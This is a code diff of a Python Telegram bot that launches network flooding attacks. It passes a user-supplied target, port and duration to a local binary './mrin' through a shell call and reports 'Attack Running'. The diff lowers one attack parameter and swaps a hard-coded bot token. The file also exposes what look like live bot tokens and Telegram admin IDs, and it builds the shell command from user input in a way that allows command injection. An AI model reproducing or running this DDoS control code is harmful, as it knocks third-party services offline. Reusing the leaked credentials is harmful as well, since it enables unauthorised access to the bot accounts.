@@ -7,7 +7,7 @@ import requests
 import platform
 import socket
 
-bot_tokens = ['7151529676:AAED9GJZKQy3kVZCy6xUbYqAlKRggfZ2Uto']
+bot_tokens = ['7910026816:AAEFPLQCMI4C9-YhMvhBmqZ7DeYJkPCxvNs']
 admin_ids = ["7383077317", "6240348610", "6188354219", "1066744659", "8159441634"]
 
 allowed_user_ids = []
@@ -171,7 +171,7 @@ def create_handlers(bot):
                     response = "Error: Time interval must be less than 380."
                 else:
                     response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
-                    full_command = f"./mrin {target} {port} {duration} 1800"
+                    full_command = f"./mrin {target} {port} {duration} 150"
                     subprocess.Popen(full_command, shell=True)
 
                     # Log if not admin
